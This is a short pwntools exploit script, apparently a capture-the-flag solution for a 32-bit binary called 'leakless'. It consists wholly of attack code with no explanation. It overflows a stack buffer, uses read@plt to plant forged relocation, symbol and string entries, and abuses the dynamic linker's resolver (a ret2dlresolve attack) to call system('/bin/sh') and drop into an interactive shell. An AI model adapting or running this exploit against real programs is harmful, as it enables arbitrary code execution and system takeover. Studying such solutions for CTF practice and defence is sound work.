from pwn import *
r = process("./leakless")
def main():
	offset = 76
	read_plt = 0x080483c0
	main = 0x080485fa
	buf = 0x0804a030 + 0x600
	relplt = 0x08048354
	dynsym = 0x080481cc
	dynstr = 0x0804828c
	plt0 = 0x080483b0

	p = "A" * 76
	p += p32(read_plt)
	p += p32(main)
	p += p32(0)
	p += p32(buf)
	p += p32(0x100)

	r.sendline(p)

	q = ""
	q += p32(buf)
	q += p32(0x7 | ((buf + 12 - dynsym) / 16) << 8)
	q += "A" * 4

	q += p32(buf + 28 - dynstr)
	q += p32(0)
	q += p32(0)
	q += p32(0x12)
	q += "system\x00\x00"
	q += "/bin/sh\x00"
	r.sendline(q)

	s = "A" * 76
	s += p32(plt0)
	s += p32(buf - relplt)
	s += 'X' * 4
	s += p32(buf + 36)

	r.sendline(s)
	r.interactive()


if __name__ == '__main__':
	main()